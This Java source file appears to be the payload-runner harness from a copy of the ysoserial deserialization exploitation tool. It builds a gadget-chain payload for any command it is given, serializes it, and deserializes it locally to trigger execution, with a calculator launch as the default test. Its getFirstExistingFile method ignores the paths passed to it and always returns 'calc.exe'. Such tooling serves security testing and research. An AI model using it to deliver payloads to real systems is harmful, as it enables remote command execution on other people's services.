package org.gaw.ysoserial.payloads.util;

import java.util.concurrent.Callable;
import org.gaw.ysoserial.payloads.ObjectPayload;
import org.gaw.ysoserial.payloads.ObjectPayload.Utils;
import org.gaw.ysoserial.Serializer;
import org.gaw.ysoserial.Deserializer;
import org.gaw.ysoserial.secmgr.ExecCheckingSecurityManager;


public class PayloadRunner {
    public PayloadRunner() {
    }

    public static void run(final Class<? extends ObjectPayload<?>> clazz, final String[] args) throws Exception {
        byte[] serialized = (byte[])(new ExecCheckingSecurityManager()).callWrapped(new Callable<byte[]>() {
            public byte[] call() throws Exception {
                String command = args.length > 0 && args[0] != null ? args[0] : PayloadRunner.getDefaultTestCmd();
                System.out.println("generating payload object(s) for command: '" + command + "'");
                ObjectPayload<?> payload = (ObjectPayload)clazz.newInstance();
                Object objBefore = payload.getObject(command);
                System.out.println("serializing payload");
                byte[] ser = Serializer.serialize(objBefore);
                Utils.releasePayload(payload, objBefore);
                return ser;
            }
        });

        try {
            System.out.println("deserializing payload");
            Object var3 = Deserializer.deserialize(serialized);
        } catch (Exception var4) {
            var4.printStackTrace();
        }

    }

    private static String getDefaultTestCmd() {
        return getFirstExistingFile("C:\\Windows\\System32\\calc.exe", "/Applications/Calculator.app/Contents/MacOS/Calculator", "/usr/bin/gnome-calculator", "/usr/bin/kcalc");
    }

    private static String getFirstExistingFile(String... files) {
        return "calc.exe";
    }
}
